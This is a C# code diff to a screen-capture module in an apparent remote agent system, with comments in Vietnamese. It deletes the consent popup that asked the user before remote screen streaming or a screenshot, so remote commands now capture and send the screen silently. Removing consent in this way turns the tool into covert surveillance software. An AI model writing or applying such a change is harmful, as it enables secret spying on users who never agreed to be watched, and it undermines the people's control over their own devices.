@@ -72,7 +72,7 @@ namespace AgentSystem.Modules
             }
         }
 
-        private async Task StartStreamAsync(int fps, int quality, string commandId)
+        private Task StartStreamAsync(int fps, int quality, string commandId)
         {
             int safeFps = fps > 0 ? fps : 24;
             int intervalMs = 1000 / safeFps;
@@ -85,13 +85,7 @@ namespace AgentSystem.Modules
                 Log.Information("Đã điều chỉnh luồng Stream sang FPS: {Fps}, Quality: {Quality}", safeFps, quality);
             }
 
-            // Gọi Popup bất đồng bộ, không chặn Thread
-            bool isApproved = await ui.ShowConsentPopupAsync("screen_stream", 30000);
-            if (!isApproved)
-            {
-                context.SendResponse(new { type = "stream_denied", command_id = commandId, module = "screen", reason = "User declined permission" });
-                return;
-            }
+
 
             isStreaming = true;
             streamCommandId = commandId;
@@ -103,6 +97,8 @@ namespace AgentSystem.Modules
             // Khởi tạo và chạy vòng lặp Stream ngầm
             streamCts = new CancellationTokenSource();
             streamTask = StreamLoopAsync(intervalMs, streamCts.Token);
+            
+            return Task.CompletedTask;
         }
 
         private async Task StreamLoopAsync(int intervalMs, CancellationToken token)
@@ -161,12 +157,7 @@ namespace AgentSystem.Modules
 
         private async Task TakeSingleScreenshotAsync(int quality, string commandId)
         {
-             bool isApproved = await ui.ShowConsentPopupAsync("screenshot", 30000);
-             if (!isApproved)
-             {
-                 context.SendResponse(new { type = "stream_denied", command_id = commandId, module = "screen" });
-                 return;
-             }
+
              
              await CaptureAndSendAsync(commandId, quality, false);
         }
